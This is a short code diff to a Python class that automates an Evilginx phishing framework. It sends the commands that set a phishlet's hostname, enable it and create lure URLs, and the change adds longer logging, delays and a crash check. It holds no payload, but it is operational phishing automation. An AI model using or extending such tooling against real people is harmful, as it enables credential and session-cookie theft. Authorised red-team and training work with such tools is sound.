@@ -300,9 +300,13 @@ class InstanceManager:
 
         try:
             resp = proc.send(f"phishlets hostname {phishlet_name} {phishlet_hostname}")
-            logger.info("phishlets hostname output: %s", resp[-200:])
+            logger.info("phishlets hostname output: %s", resp[-300:])
+            time.sleep(1)
             resp = proc.send(f"phishlets enable {phishlet_name}")
-            logger.info("phishlets enable output: %s", resp[-200:])
+            logger.info("phishlets enable output: %s", resp[-300:])
+            if not proc.alive():
+                raise EvilginxError(f"evilginx crashed after phishlets enable")
+            time.sleep(2)
             # lure create + get-url
             lout = proc.send(f"lures create {phishlet_name}")
             logger.info("lures create output: %s", lout[-400:])
